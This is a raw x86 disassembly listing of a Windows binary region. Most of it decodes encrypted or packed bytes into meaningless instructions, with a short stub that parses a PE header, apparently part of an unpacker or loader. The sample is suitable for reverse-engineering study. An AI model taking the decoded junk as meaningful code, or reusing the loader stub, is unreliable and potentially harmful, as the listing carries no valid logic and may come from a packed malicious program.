  40fa1b:	mov    esi,0xedd9768b
  40fa20:	jb     0x40fa09
  40fa22:	fwait
  40fa23:	mov    ebx,0xdfa95cc0
  40fa28:	into   
  40fa29:	ss jmp 0x5f4a:0x2ecaabc0
  40fa31:	test   eax,0x7d56931
  40fa36:	out    0xac,al
  40fa38:	repz add al,0x25
  40fa3b:	pushf  
  40fa3c:	(bad)  
  40fa3d:	(bad)  
  40fa3e:	(bad)  
  40fa3f:	int3   
  40fa40:	lahf   
  40fa41:	daa    
  40fa42:	and    ch,BYTE PTR [ebp-0x2d2ff5e3]
  40fa48:	addr16 cwde 
  40fa4a:	lds    ecx,FWORD PTR [edx+0x66]
  40fa4d:	inc    eax
  40fa4e:	xchg   edx,eax
  40fa4f:	leave  
  40fa50:	add    al,BYTE PTR [edi]
  40fa52:	cs push cs
  40fa54:	out    0x1f,al
  40fa56:	jge    0x40f9da
  40fa58:	mov    ecx,0xa143a1d4
  40fa5d:	mov    ah,0x26
  40fa5f:	xchg   ecx,eax
  40fa60:	xchg   esi,eax
  40fa61:	bound  edx,QWORD PTR ds:[edi]
  40fa64:	aaa    
  40fa65:	lods   eax,DWORD PTR ds:[esi]
  40fa66:	mov    dh,0x50
  40fa68:	out    dx,al
  40fa69:	mov    DWORD PTR [edi+0x556096bb],esp
  40fa6f:	push   edx
  40fa70:	cmp    ch,BYTE PTR [edx+ebp*4]
  40fa73:	push   ebp
  40fa74:	push   esp
  40fa75:	sbb    DWORD PTR [edi+0x61],0xf10d09ff
  40fa7c:	push   eax
  40fa7d:	inc    ebx
  40fa7e:	jne    0x40fa72
  40fa80:	mov    WORD PTR [ecx+0x3d8bd451],?
  40fa86:	sub    eax,0xf40d5cc5
  40fa8b:	mov    esi,0x2eb315f8
  40fa90:	(bad)  
  40fa91:	adc    eax,0x9e81b592
  40fa96:	sbb    BYTE PTR [edi],ah
  40fa98:	test   al,0x8c
  40fa9a:	sub    al,0x54
  40fa9c:	rcr    ebx,cl
  40fa9e:	imul   ebx,DWORD PTR ds:0xf182cebd,0x49
  40faa5:	rcr    DWORD PTR [ecx-0x553566ec],1
  40faab:	pushf  
  40faac:	rol    BYTE PTR [ecx+0x64],1
  40faaf:	mov    esp,0x110acc
  40fab4:	xchg   ebp,eax
  40fab5:	xchg   ecx,eax
  40fab6:	jbe    0x40fac0
  40fab8:	fnstenv [ebp+0x29]
  40fabb:	mov    WORD PTR [ebp-0x45a484a8],cs
  40fac1:	jl     0x40fb34
  40fac3:	gs push ds
  40fac5:	sbb    al,BYTE PTR [ebx+0x2cf086cf]
  40facb:	in     eax,0x30
  40facd:	inc    ebp
  40face:	fidivr DWORD PTR [esi]
  40fad0:	xchg   ebp,eax
  40fad1:	push   edi
  40fad2:	les    eax,FWORD PTR [ecx+0x5f916b1e]
  40fad8:	call   0xdb9d:0x118f4c36
  40fadf:	cmp    ax,0xbab5
  40fae3:	pusha  
  40fae4:	cmp    al,0xb5
  40fae6:	scas   al,BYTE PTR es:[edi]
  40fae7:	outs   dx,BYTE PTR ds:[esi]
  40fae8:	adc    DWORD PTR [esp+ecx*1],ebp
  40faeb:	mov    esi,0xd4224f20
  40faf0:	out    dx,eax
  40faf1:	out    dx,al
  40faf2:	cmp    BYTE PTR [esp+ebp*8],al
  40faf5:	cmp    bh,BYTE PTR [ebx]
  40faf7:	jnp    0x40fb52
  40faf9:	rol    BYTE PTR ds:0xad7d71d1,1
  40faff:	mov    ch,0x6b
  40fb01:	jae    0x40fb6d
  40fb03:	pop    es
  40fb04:	push   ecx
  40fb05:	inc    edx
  40fb06:	cmp    BYTE PTR [edx-0x3a],dl
  40fb09:	scas   al,BYTE PTR es:[edi]
  40fb0a:	imul   eax,DWORD PTR ds:0xb63dda37,0x32948513
  40fb14:	jb     0x40fb08
  40fb16:	and    bh,BYTE PTR [edi+ebp*2+0x5204b2ef]
  40fb1d:	add    DWORD PTR ds:0x94b3f7f3,ebx
  40fb23:	in     al,dx
  40fb24:	aam    0x18
  40fb26:	add    DWORD PTR [edx+0x7c],edx
  40fb29:	push   es
  40fb2a:	jle    0x40fac5
  40fb2c:	jp     0x40fb16
  40fb2e:	pop    eax
  40fb2f:	lods   eax,DWORD PTR ds:[esi]
  40fb30:	les    ebp,FWORD PTR [esi+esi*4]
  40fb33:	adc    dh,BYTE PTR [ecx-0x56505c57]
  40fb39:	xor    al,0x1a
  40fb3b:	push   eax
  40fb3c:	shl    ch,0x73
  40fb3f:	add    al,0xab
  40fb41:	clc    
  40fb42:	mov    al,0x7d
  40fb44:	(bad)  
  40fb45:	push   edi
  40fb46:	test   eax,0x1eff4b41
  40fb4b:	pop    edx
  40fb4c:	jb     0x40fb2e
  40fb4e:	shr    BYTE PTR [ebx-0x4c],1
  40fb51:	jbe    0x40fb22
  40fb53:	push   esi
  40fb54:	pop    esi
  40fb55:	ret    
  40fb56:	xchg   ch,dh
  40fb58:	cmp    ebp,ebp
  40fb5a:	sbb    eax,ebx
  40fb5c:	adc    al,0x4b
  40fb5e:	aad    0xc7
  40fb60:	dec    esi
  40fb61:	jae    0x40fbd3
  40fb63:	mov    DWORD PTR [edx+0x6eb0920f],ecx
  40fb69:	stos   BYTE PTR es:[edi],al
  40fb6a:	cmp    BYTE PTR [ecx+0x26],bh
  40fb6d:	ins    BYTE PTR es:[edi],dx
  40fb6e:	and    bl,ah
  40fb70:	fiadd  DWORD PTR [ebx]
  40fb72:	sbb    BYTE PTR [ecx+0x57b371cb],dl
  40fb78:	ss push 0x5f
  40fb7b:	mov    bl,0xa0
  40fb7d:	cmp    DWORD PTR [esp+ebp*4+0x83f5e4f],ebx
  40fb84:	sbb    esi,DWORD PTR [edi]
  40fb86:	jl     0x40fb3a
  40fb88:	sahf   
  40fb89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb8a:	mov    dl,0xb2
  40fb8c:	(bad)  
  40fb8d:	bnd jmp 0x40fbd2
  40fb90:	mov    ebp,0x4aac5fed
  40fb95:	sbb    ah,BYTE PTR [esi+0x51fa25ec]
  40fb9b:	neg    DWORD PTR ds:0x42e1a4
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0x8f
  40fbb3:	psubw  mm5,QWORD PTR [esi+0x7070b182]
  40fbba:	mov    ds:0x7a70707d,eax
  40fbbf:	out    dx,al
  40fbc0:	mov    esi,0x76346a93
  40fbc5:	push   eax
  40fbc6:	push   esp
  40fbc7:	mov    dh,0xed
  40fbc9:	inc    edi
  40fbca:	cmp    BYTE PTR [ebp+0x40],cl
  40fbcd:	pop    ecx
  40fbce:	(bad)  
  40fbcf:	lock dec esp
  40fbd1:	daa    
  40fbd2:	push   esp
  40fbd3:	add    al,0x8b
  40fbd5:	jmp    0xf889:0x8bf172f8
  40fbdc:	mov    esp,0x2bedb654
  40fbe1:	jmp    0x95221b6c
  40fbe6:	add    al,0xc2
  40fbe8:	rcr    DWORD PTR [esi+ecx*8-0x4c47d68],1
  40fbef:	pusha  
  40fbf0:	push   eax
  40fbf1:	jbe    0x40fbae
  40fbf3:	sbb    al,0xef
  40fbf5:	shr    DWORD PTR [edx+0x66faa928],0x99
  40fbfc:	loope  0x40fb8c
  40fbfe:	mov    esi,0x5b2ed6d0
  40fc03:	in     al,dx
  40fc04:	sti    
  40fc05:	das    
  40fc06:	push   edi
  40fc07:	shl    DWORD PTR [eax],cl
  40fc09:	xchg   esi,eax
  40fc0a:	data16 cmp al,0xf
  40fc0d:	xlat   BYTE PTR ds:[ebx]
  40fc0e:	popf   
  40fc0f:	mov    eax,ds:0xf1277d79
  40fc14:	cmc    
  40fc15:	ds loop 0x40fc6c
  40fc18:	push   ecx
  40fc19:	xchg   BYTE PTR [ecx-0x5ed48c4a],dh
  40fc1f:	retf   
  40fc20:	stc    
  40fc21:	xor    BYTE PTR ds:0x63bfd174,bh
  40fc27:	addr16 jo 0x40fca7
  40fc2a:	ror    ecx,1
  40fc2c:	lock dec ebx
  40fc2e:	sbb    ecx,esi
  40fc30:	and    al,BYTE PTR [edi+0x62]
  40fc33:	std    
  40fc34:	hlt    
  40fc35:	push   edi
  40fc36:	(bad)  
  40fc38:	jo     0x40fc7d
  40fc3a:	sbb    eax,0x533e0357
  40fc3f:	gs aad 0x1f
  40fc42:	sub    edi,edx
  40fc44:	jmp    0x2151:0x5415d6d2
  40fc4b:	inc    edi
  40fc4c:	jmp    0xc1719b88
  40fc51:	adc    BYTE PTR [ecx+0x705a2d90],ah
  40fc57:	loop   0x40fccd
  40fc59:	push   eax
  40fc5a:	sub    eax,0xec866735
  40fc5f:	pusha  
  40fc60:	scas   eax,DWORD PTR es:[edi]
  40fc61:	inc    ecx
  40fc62:	inc    ebp
  40fc63:	je     0x40fc2e
  40fc65:	cmp    eax,DWORD PTR ds:0xd2a5af35
  40fc6b:	add    ax,0xc864
  40fc70:	shl    BYTE PTR [ecx-0x280f91e8],0x85
  40fc77:	call   0xde0da002
  40fc7c:	es xchg ecx,eax
  40fc7e:	ins    DWORD PTR es:[edi],dx
  40fc7f:	div    bl
  40fc81:	mov    edx,0xf6dc8eb8
  40fc86:	pop    ss
  40fc87:	push   esi
  40fc88:	xor    ebp,DWORD PTR [ebx+eiz*1+0x8]
  40fc8c:	mov    esi,0x7b29f055
  40fc91:	adc    al,0x2d
  40fc93:	sub    eax,0xe58da4ea
  40fc98:	ja     0x40fc22
  40fc9a:	inc    WORD PTR [edx+ebx*8-0x72]
  40fc9f:	inc    ebp
  40fca0:	sub    esi,DWORD PTR [esi-0x3e]
  40fca3:	imul   ebx,DWORD PTR [edx],0x4d
  40fca6:	add    ah,bh
  40fca8:	and    ch,ah
  40fcaa:	jmp    0x6241:0xfc28e40c
  40fcb1:	mov    bl,0x26
  40fcb3:	jecxz  0x40fcf7
  40fcb5:	dec    ebx
  40fcb6:	add    DWORD PTR [ecx+edi*1-0x2e],edx
  40fcba:	ret    0x4ab
  40fcbd:	loop   0x40fc82
  40fcbf:	dec    esp
  40fcc0:	mov    WORD PTR [edi],cs
  40fcc2:	push   es
  40fcc3:	addps  xmm7,XMMWORD PTR [edi+ecx*1+0x4ac634c6]
  40fccb:	mov    ah,0x5a
  40fccd:	add    ch,dl
  40fccf:	xor    al,0x14
  40fcd1:	xchg   ebp,eax
  40fcd2:	push   eax
  40fcd3:	add    DWORD PTR [edx+ebx*4],eax
  40fcd6:	push   es
  40fcd7:	ret    
  40fcd8:	test   al,0xf0
  40fcda:	inc    ebx
  40fcdb:	sbb    eax,0xaca601b9
  40fce0:	jae    0x40fc77
  40fce2:	shl    DWORD PTR [edi+0x45f13fe0],1
  40fce8:	mov    esp,0xf5d77c61
  40fced:	xchg   esp,eax
  40fcee:	rol    edi,0xc5
  40fcf1:	fld    TBYTE PTR [ecx-0x75]
  40fcf4:	mov    ecx,0x843c5087
  40fcf9:	(bad)  
  40fcfa:	pop    ebx
  40fcfb:	ficomp DWORD PTR cs:[ebx]
  40fcfe:	loope  0x40fcda
  40fd00:	shl    DWORD PTR [eax-0x7f001afb],cl
  40fd06:	addr16 fs cli 
  40fd09:	pop    es
  40fd0a:	jp     0x40fd65
  40fd0c:	sbb    dl,BYTE PTR [eax-0x1]
  40fd0f:	rcr    BYTE PTR ds:0x6fbcd769,1
  40fd15:	mov    ah,0x87
  40fd17:	sbb    BYTE PTR [ecx+0xc],ah
  40fd1a:	adc    edx,esp
  40fd1c:	ja     0x40fd1d
  40fd1e:	jne    0x40fd28
  40fd20:	loop   0x40fd0f
  40fd22:	clc    
  40fd23:	mov    ah,0x62
  40fd25:	xchg   DWORD PTR [ebx-0x74d692cd],esi
  40fd2b:	push   edi
  40fd2c:	push   edx
  40fd2d:	mov    ecx,0xa587d693
  40fd32:	rcr    DWORD PTR ds:0xd2058ecb,0x2d
  40fd39:	cwde   
  40fd3a:	jb     0x40fd8a
  40fd3c:	mov    esi,0x5034bf7a
  40fd41:	sbb    DWORD PTR [edx-0x7bf9b3bd],ecx
  40fd47:	mov    eax,ds:0x2fec713e
  40fd4c:	cmp    edi,DWORD PTR [eax-0x5d9b7e30]
  40fd52:	mov    esi,DWORD PTR [eax+0x3b5010bb]
  40fd58:	xchg   ebx,eax
  40fd59:	retf   0x146b
  40fd5c:	push   esp
  40fd5d:	loopne 0x40fce3
  40fd5f:	imul   ebp,ebx,0xf16b77ef
  40fd65:	stos   BYTE PTR es:[edi],al
  40fd66:	ret    
  40fd67:	int3   
  40fd68:	inc    ecx
  40fd69:	push   gs
  40fd6b:	mov    edx,0xa7b69e3e
  40fd70:	(bad)  
  40fd72:	cs xchg esp,eax
  40fd74:	sub    DWORD PTR ds:0xeeff,0x814b77ac
  40fd7d:	or     BYTE PTR [edi],bh
  40fd7f:	push   ebp
  40fd80:	outs   dx,BYTE PTR ds:[esi]
  40fd81:	sub    ah,BYTE PTR [edx+0x6368858c]
  40fd87:	rcl    DWORD PTR [eax+0x3f],cl
  40fd8a:	xor    al,0x9e
  40fd8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd8d:	mov    dh,0x1b
  40fd8f:	fdivr  DWORD PTR [edx-0x71]
  40fd92:	(bad)  
  40fd93:	pop    edx
  40fd94:	enter  0x4e21,0x2b
  40fd98:	adc    eax,0xc939f0e8
  40fd9d:	enter  0x609c,0xf7
  40fda1:	push   esp
  40fda2:	mov    dh,BYTE PTR [ebx-0x4c]
  40fda5:	add    eax,DWORD PTR [edx+0x18]
  40fda8:	out    dx,al
  40fda9:	jle    0x40fd60
  40fdab:	sub    DWORD PTR [ebx+0x6e52d76b],esi
  40fdb1:	mov    BYTE PTR [ebx-0x6f],ch
  40fdb4:	adc    bl,BYTE PTR [edx+esi*2+0x63]
  40fdb8:	and    al,0x8
  40fdba:	fwait
  40fdbb:	in     al,dx
  40fdbc:	sti    
  40fdbd:	outs   dx,BYTE PTR ds:[esi]
  40fdbe:	mov    eax,0x59c2fecf
  40fdc3:	xchg   esp,eax
  40fdc4:	fcmovne st,st(3)
  40fdc6:	jb     0x40fdd6
  40fdc8:	lds    esi,FWORD PTR [edx]
  40fdca:	jmp    0x40fdf0
  40fdcc:	mov    eax,0xd7d32dda
  40fdd1:	sbb    eax,0xb24e2578
  40fdd6:	ds sti 
  40fdd8:	loope  0x40fd76
  40fdda:	(bad)  
  40fddb:	enter  0x91b,0xd9
  40fddf:	mov    al,ds:0x71a7dd2c
  40fde4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fde5:	rol    DWORD PTR [esi-0x15],0x8f
  40fde9:	pop    ebp
  40fdea:	pop    edx
  40fdeb:	mov    esp,0x4985cefd
  40fdf1:	add    eax,0x5867d0ec
  40fdf6:	pop    ds
  40fdf7:	inc    ebp
  40fdf8:	sbb    al,0x91
  40fdfa:	(bad)  
  40fdfc:	push   edx
  40fdfd:	popf   
  40fdfe:	pop    esi
  40fdff:	mov    esp,0x861392a1
  40fe04:	jle    0x40fdd2
  40fe06:	dec    esi
  40fe07:	repz shl BYTE PTR [eax+0x20],cl
  40fe0b:	jne    0x40fd8e
  40fe0d:	mov    edx,0x289f0a2f
  40fe12:	xchg   esi,eax
  40fe13:	mov    WORD PTR [esi-0x230d7904],ds
  40fe19:	mov    edx,0xd9eda225
  40fe1e:	sub    eax,ebx
  40fe20:	pop    esp
  40fe21:	ffreep st(6)
  40fe23:	clc    
  40fe24:	sub    eax,0x5ff249f0
  40fe29:	in     al,dx
  40fe2a:	stc    
  40fe2b:	int3   
  40fe2c:	call   DWORD PTR [ebx]
  40fe2e:	add    ah,BYTE PTR [ebx-0x671e267b]
  40fe34:	inc    ebp
  40fe35:	cmp    al,0x96
  40fe37:	add    ebx,DWORD PTR [eax-0x4e]
  40fe3a:	mov    bh,0x96
  40fe3c:	test   ebp,edi
  40fe3e:	fst    QWORD PTR [esi+eiz*1+0x11cafe6e]
  40fe45:	(bad)
  40fe48:	pop    ds
  40fe49:	ins    DWORD PTR es:[edi],dx
  40fe4a:	dec    esp
  40fe4b:	add    ebx,DWORD PTR [eax+0x300b05d0]
  40fe51:	xchg   ebp,eax
  40fe52:	int    0x3e
  40fe54:	xor    ecx,0x2a87404c
  40fe5a:	inc    ebx
  40fe5b:	mov    ?,WORD PTR [esi-0x225432c5]
  40fe61:	add    ecx,0x6e
  40fe64:	addr16 xchg ecx,ebp
  40fe67:	loope  0x40feb0
  40fe69:	jg     0x40feaf
  40fe6b:	stos   BYTE PTR es:[edi],al
  40fe6c:	xor    eax,0x97c38659
  40fe71:	lahf   
  40fe72:	pushf  
  40fe73:	sbb    BYTE PTR [edx],ch
  40fe75:	add    al,0xe7
  40fe77:	test   al,0x2e
  40fe79:	aam    0x73
  40fe7b:	cmp    DWORD PTR [edx+0x53],edx
  40fe7e:	xchg   ecx,eax
  40fe7f:	icebp  
  40fe80:	out    dx,eax
  40fe81:	push   ds
  40fe82:	stos   BYTE PTR es:[edi],al
  40fe83:	mov    WORD PTR [ebx+ebx*8+0x6c],?
  40fe87:	lods   eax,DWORD PTR ds:[esi]
  40fe88:	xor    BYTE PTR [esi],0xfb
  40fe8b:	ds xchg edx,eax
  40fe8d:	mov    edx,0x2f2ceb04
  40fe92:	push   ebp
  40fe93:	lock xchg esp,eax
  40fe95:	inc    ebp
  40fe96:	(bad)  
  40fe98:	fwait
  40fe99:	push   ss
  40fe9a:	stos   BYTE PTR es:[edi],al
  40fe9b:	or     eax,0x67a0be27
  40fea0:	rol    DWORD PTR ds:0x6b79ae7c,0xda
  40fea7:	daa    
  40fea8:	jae    0x40fea3
  40feaa:	addr16 inc ecx
  40feac:	test   al,dh
  40feae:	or     eax,DWORD PTR [ecx-0x25]
  40feb1:	push   cs
  40feb2:	jp     0x40ff21
  40feb4:	retf   0x98ae
  40feb7:	retf   0x5c9c
  40feba:	ficom  WORD PTR [eax]
  40febc:	cmp    al,0xa4
  40febe:	enter  0x2a6a,0x25
  40fec2:	ins    DWORD PTR es:[edi],dx
  40fec3:	xchg   BYTE PTR ds:0x90ea6b1c,dl
  40fec9:	lods   eax,DWORD PTR ds:[esi]
  40feca:	in     eax,0x5f
  40fecc:	sub    DWORD PTR [esi],ebx
  40fece:	cli    
  40fecf:	push   cs
  40fed0:	cmc    
  40fed1:	aaa    
  40fed2:	mov    dh,0xc3
  40fed4:	test   al,0x27
  40fed6:	sahf   
  40fed7:	out    0x9b,eax
  40fed9:	dec    eax
  40feda:	(bad)  
  40fedb:	sbb    esp,DWORD PTR ds:0x516be814
  40fee1:	nop
  40fee2:	sub    ebp,DWORD PTR [edi-0xfd3b783]
  40fee8:	ret    
  40fee9:	mov    esp,0x89c75ac8
  40feee:	and    eax,0x5b8a000f
  40fef3:	fist   WORD PTR [ebp+0x28]
  40fef6:	fimul  DWORD PTR [eax-0x2e]
  40fef9:	fcomp  DWORD PTR [esi+0x56]
  40fefc:	pushf  
  40fefd:	shl    ebx,1
  40feff:	int3   
  40ff00:	sbb    al,0xfe
  40ff02:	add    BYTE PTR [ecx],0xf9
  40ff05:	cmc    
  40ff06:	punpckhwd mm4,QWORD PTR [esi]
  40ff09:	jle    0x40ff28
  40ff0b:	call   0x203cbba9
  40ff10:	frstor [esi]
  40ff12:	daa    
  40ff13:	jmp    0x89d0:0xb5d356c6
  40ff1a:	jmp    0xa06c3425
  40ff1f:	and    al,0x85
  40ff21:	jno    0x40ff99
  40ff23:	push   esp
  40ff24:	or     DWORD PTR [eax-0x22],ecx
  40ff27:	push   ds
  40ff28:	cli    
  40ff29:	scas   eax,DWORD PTR es:[edi]
  40ff2a:	push   0xffffffa8
  40ff2c:	in     al,0x5
  40ff2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff2f:	arpl   WORD PTR [ebx-0x4d],dx
  40ff32:	out    0x9b,al
  40ff34:	addr16 sti 
  40ff36:	lods   al,BYTE PTR ds:[esi]
  40ff37:	dec    ebx
  40ff38:	or     BYTE PTR [ebp+0x64622684],ah
  40ff3e:	popf   
  40ff3f:	mov    bl,0x9
  40ff41:	cdq    
  40ff42:	icebp  
  40ff43:	scas   al,BYTE PTR es:[edi]
  40ff44:	pop    ebp
  40ff45:	add    eax,0xe88c62fd
  40ff4a:	jo     0x40ff2d
  40ff4c:	mov    dl,0x1c
  40ff4e:	les    ebp,FWORD PTR [edx+0x67e0657b]
  40ff54:	es mov ch,0xc6
  40ff57:	div    DWORD PTR [ebx]
  40ff59:	sub    al,0x5d
  40ff5b:	sub    dl,BYTE PTR [ecx+0x15]
  40ff5e:	int    0xba
  40ff60:	jnp    0x40ffba
  40ff62:	sub    edx,ecx
  40ff64:	sub    al,0x46
  40ff66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff67:	mov    ebp,edi
  40ff69:	js     0x40ff51
  40ff6b:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40ff72:	mov    eax,DWORD PTR [ebp+0x8]
  40ff75:	mov    al,BYTE PTR [eax]
  40ff77:	mov    DWORD PTR ds:0x42e1b4,0x3a3a
  40ff81:	add    al,0x37
  40ff83:	xor    DWORD PTR ds:0x42e777,0x42fdfe
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fd51,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fdf6
  40ffaa:	and    edx,DWORD PTR ds:0x42e77b
  40ffb0:	mov    DWORD PTR ds:0x42fdf6,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e783,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffdd:	mov    cl,0x18
  40ffdf:	fnsave ds:0xa37070bd
  40ffe5:	jge    0x410057
  40ffe7:	jo     0x40ff9b
  40ffe9:	xchg   esp,eax
  40ffea:	xor    BYTE PTR [edx],0xf5
  40ffed:	cli    
  40ffee:	pop    esi
  40ffef:	ss jle 0x40ff75
  40fff2:	and    BYTE PTR [eax-0x6f152abf],cl
  40fff8:	pusha  
  40fff9:	push   eax
  40fffa:	cmp    bh,BYTE PTR [edx]
  40fffc:	(bad)  
  40fffe:	js     0x40ffa2
  410000:	add    DWORD PTR [eax],edx
  410002:	mov    ebp,0x6ebffe09
  410007:	in     al,0x3d
  410009:	(bad)  
  41000b:	push   esp
  41000c:	mov    cl,0x25
  41000e:	pusha  
  41000f:	mov    al,0x16
  410011:	rol    BYTE PTR [edi],0xd8
  410014:	fst    QWORD PTR [eax]
  410016:	sub    cl,BYTE PTR [edx+eax*8+0x2784f1f8]
  41001d:	aad    0x13
  41001f:	sar    al,cl
  410021:	inc    esp
  410022:	xor    al,0xb3
  410024:	je     0x410027
  410026:	nop
  410027:	or     DWORD PTR [esi+0x7e],eax
  41002a:	mov    WORD PTR [esi+0x72],ss
  41002d:	jge    0x40ffee
  41002f:	jno    0x410047
  410031:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410032:	and    al,0x22
  410034:	(bad)  
  410035:	je     0x410004
  410037:	lods   eax,DWORD PTR ds:[esi]
  410038:	xor    eax,0xd601d5c6
  41003d:	sahf   
  41003e:	aaa    
  41003f:	adc    eax,0x2ff76ab6
  410044:	push   ecx
  410045:	test   BYTE PTR [ebp+ecx*1-0x58],dl
  410049:	xor    ah,cl
  41004b:	pop    ds
  41004c:	xor    bl,cl
  41004e:	jbe    0x410034
  410050:	(bad)  
  410051:	xchg   ecx,eax
  410052:	add    al,0xee
  410054:	sti    
  410055:	pop    edx
  410056:	lock sub eax,DWORD PTR [edi+0x44379347]
  41005d:	shl    BYTE PTR [ebp+0x140c16d2],cl
  410063:	sub    bh,BYTE PTR [edx+0x35]
  410066:	cld    
  410067:	jle    0x410033
  410069:	sbb    ah,bl
  41006b:	in     al,0x13
  41006d:	cmp    eax,0xc8509952
  410072:	cmp    ebx,DWORD PTR [edi]
  410074:	fwait
  410075:	pop    ss
  410076:	ficom  DWORD PTR [ebp+eax*4-0x71]
  41007a:	xchg   ebx,eax
  41007b:	mov    al,ds:0x3da1866b
  410080:	and    eax,0x47839929
  410085:	sub    al,0x90
  410088:	or     bh,BYTE PTR [esi+0x4f]
  41008b:	mov    ds:0x835bdf1f,al
  410090:	dec    ebp
  410091:	or     al,0x66
  410093:	sbb    BYTE PTR [ebx-0x450673f9],dh
  410099:	test   ecx,edi
  41009b:	lods   al,BYTE PTR ds:[si]
  41009d:	loopne 0x41008f
  41009f:	jae    0x410076
  4100a1:	jl     0x41003f
  4100a3:	gs gs jmp 0x7883ebb6
  4100aa:	or     al,0x6b
  4100ac:	sub    BYTE PTR [edx],ah
  4100ae:	ret    0x65e9
  4100b1:	sahf   
  4100b2:	dec    edx
  4100b3:	sbb    ah,BYTE PTR [edx-0xfe1a262]
  4100b9:	dec    esi
  4100ba:	add    al,0x8a
  4100bc:	cwde   
  4100bd:	pop    esi
  4100be:	and    BYTE PTR [eax+0x28b0096a],ah
  4100c4:	sbb    eax,0xe48613ea
  4100c9:	daa    
  4100ca:	pop    eax
  4100cb:	xlat   BYTE PTR ds:[ebx]
  4100cc:	mov    edx,0xdc2303c4
  4100d1:	adc    bl,BYTE PTR [esi+eax*4+0x46a0cbdb]
  4100d8:	loopne 0x410147
  4100da:	xchg   ecx,eax
  4100db:	mov    edx,0x1bcef9f2
  4100e0:	fisttp WORD PTR [ecx+0x5c5ab684]
  4100e6:	out    dx,eax
  4100e7:	fcom   DWORD PTR [esi-0x723d7864]
  4100ed:	addr16 in eax,dx
  4100ef:	ja     0x4100df
  4100f1:	pusha  
  4100f2:	ror    BYTE PTR [ebp+0x58],cl
  4100f5:	fnsave [edi+ecx*1+0x1c]
  4100f9:	in     eax,0x50
  4100fb:	sbb    bl,bh
  4100fd:	dec    eax
  4100fe:	jne    0x410116
  410100:	add    eax,0x58974b1e
  410105:	wrmsr  
  410107:	jmp    0x41010b
  410109:	inc    esp
  41010a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41010b:	xchg   edx,eax
  41010c:	mov    eax,0xadf1c60a
  410111:	jb     0x4100aa
  410113:	cdq    
  410114:	pusha  
  410115:	mov    bh,0x37
  410117:	(bad)  
  410119:	int    0x5d
  41011b:	xor    al,dl
  41011d:	mov    DWORD PTR [edx+0x41],eax
  410120:	sub    esp,0x9bb2aa11
  410126:	scas   al,BYTE PTR es:[edi]
  410127:	iret   
  410128:	pop    ecx
  410129:	in     al,dx
  41012a:	cmp    esi,DWORD PTR [eax-0x20eb82ac]
  410130:	icebp  
  410131:	bound  ebp,QWORD PTR [ebx-0x6]
  410134:	cmp    BYTE PTR [edi-0x15064816],bl
  41013a:	mov    esp,0x9c379271
  41013f:	loope  0x410106
  410141:	pop    eax
  410142:	sar    DWORD PTR [ebp-0x7c7c1ac7],0xda
  410149:	mov    dh,0x8a
  41014b:	stos   DWORD PTR es:[edi],eax
  41014c:	adc    eax,DWORD PTR ds:0x8fff8734
  410152:	xchg   DWORD PTR [edi+0x7b906785],edx
  410158:	xchg   DWORD PTR [ebx+eiz*4-0x78],esp
  41015c:	jp     0x410190
  41015e:	cwde   
  41015f:	jl     0x41019e
  410161:	mov    esi,0x9e3f7a2c
  410166:	ret    
  410167:	out    0x5b,al
  410169:	mov    bl,0xfe
  41016b:	neg    BYTE PTR [ebx+0x9]
  41016e:	and    ebx,ebx
  410170:	js     0x4101e4
  410172:	xor    cl,BYTE PTR [edx]
  410174:	pop    edi
  410175:	mov    esi,0x70786893
  41017a:	jne    0x410149
  41017c:	dec    edx
  41017d:	fist   WORD PTR [ebx+0x30]
  410180:	sar    ebp,1
  410182:	sbb    ecx,DWORD PTR [esp+ebx*4]
  410185:	cwde   
  410186:	out    dx,al
  410187:	test   BYTE PTR [edx+edi*8-0x31],bh
  41018b:	ins    BYTE PTR es:[edi],dx
  41018c:	sub    DWORD PTR [edx-0x69],ebx
  41018f:	lds    edi,FWORD PTR [ebp-0x48]
  410192:	test   BYTE PTR gs:[ebp-0xbf40c76],bl
  410199:	mov    bl,0x10
  41019b:	push   ebp
  41019c:	dec    ecx
  41019d:	shr    DWORD PTR [edi-0x6c1d9ce3],cl
  4101a3:	call   0x977f:0x6f4f6bb
  4101aa:	in     eax,0xe1
  4101ac:	cld    
  4101ad:	fimul  WORD PTR [eax-0x2853b00c]
  4101b3:	call   0xf475:0x9ec501d8
  4101ba:	cdq    
  4101bb:	jb     0x41021d
  4101bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101bf:	mov    ds:0x4899971d,eax
  4101c4:	or     eax,DWORD PTR ss:[edi+0x1d8c7698]
  4101cb:	in     al,0xf2
  4101cd:	lods   al,BYTE PTR ds:[esi]
  4101ce:	imul   edi,DWORD PTR [eax],0x9a2474e
  4101d4:	outs   dx,DWORD PTR ds:[esi]
  4101d5:	test   al,0x96
  4101d7:	mov    dl,0xfb
  4101d9:	cmc    
  4101da:	mov    ebx,0x1f69d32a
  4101df:	xchg   ecx,eax
  4101e0:	lods   eax,DWORD PTR ds:[esi]
  4101e1:	xchg   esp,eax
  4101e2:	or     bh,cl
  4101e4:	test   eax,0x3bf662ea
